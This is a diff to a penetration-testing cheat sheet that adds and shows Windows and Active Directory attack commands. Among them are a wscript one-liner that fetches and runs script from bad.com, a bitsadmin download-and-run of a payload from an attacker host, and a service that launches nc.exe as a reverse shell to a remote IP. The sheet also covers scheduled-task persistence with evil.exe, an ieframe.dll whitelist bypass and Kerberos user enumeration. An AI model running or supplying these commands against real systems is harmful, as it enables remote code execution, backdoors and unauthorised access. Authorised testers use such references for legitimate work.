@@ -52,9 +52,10 @@ showmount -e 192.168.110.102
 chown root:root sid-shell; chmod +s sid-shell
 ```
 
-### Kerberos User Enumeration
+### Kerberos Enumeration
 
 ```bash
+# users
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
 ```
 
@@ -147,6 +148,18 @@ nltest /user:"spotless"
 
 # get DC for currently authenticated session
 set l
+
+# get domain name and DC the user authenticated to
+klist
+
+# get all logon sessions. Includes NTLM authenticated sessions
+klist sessions
+
+# kerberos tickets for the session
+klist
+
+# cached krbtgt
+klist tgt
 
 # whoami on older Windows systems
 set u
@@ -433,6 +446,31 @@ __import__('os').system('id')
 
 ![https://github.com/sagishahar/lpeworkshop](../../.gitbook/assets/privesc.jpg)
 
+### Check if Powershell Logging is Enabled
+
+```text
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+```
+
+### Check WinEvent Logs for SecureString Exposure
+
+```csharp
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'
+```
+
+### Check WinEvent for Machine Wake/Sleep times
+
+```csharp
+Get-WinEvent -FilterHashTable @{ ProviderName = 'Microsoft-Windows-Power-TroubleShooter'  ; Id = 1 }|Select-Object -Property @{n='Sleep';e={$_.Properties[0].Value}},@{n='Wake';e={$_.Properties[1].Value}}
+```
+
+### Audit Policies
+
+```text
+auditpol /get /category:*
+```
+
 ### Binary Exploitation with ImmunityDebugger
 
 #### Get Loaded Modules
@@ -594,6 +632,31 @@ wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
 cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
 ```
 
+#### Wscript Script Code Download & Execution
+
+{% tabs %}
+{% tab title="cmd" %}
+```text
+echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
+```
+{% endtab %}
+
+{% tab title="code.js" %}
+```markup
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+    <![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
+    ]]>
+</script>
+</component>
+</package>
+```
+{% endtab %}
+{% endtabs %}
+
 ### Whois Data Exfiltration
 
 ```bash
@@ -716,10 +779,14 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """
 ```
 
-### Creating Persistence
+### Persistence via Services
 
 ```csharp
+# cmd
 sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
+
+# powersehll
+New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName "'C:\Program Files\NotEvil\back.exe'" -Description "Not at all"
 ```
 
 ### Port Forwarding / SSH Tunneling
@@ -885,6 +952,25 @@ openssl passwd -1 password
 # Launch evil.exe every 10 minutes
 schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
 ```
+
+## Code Execution / Application Whitelist Bypass
+
+### Ieframe.dll
+
+{% tabs %}
+{% tab title="cmd" %}
+```text
+rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
+```
+{% endtab %}
+
+{% tab title="test.url" %}
+```
+[internetshortcut]
+url=c:\windows\system32\calc.exe
+```
+{% endtab %}
+{% endtabs %}
 
 This was inspired by and forked/adapted/updated from [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
 
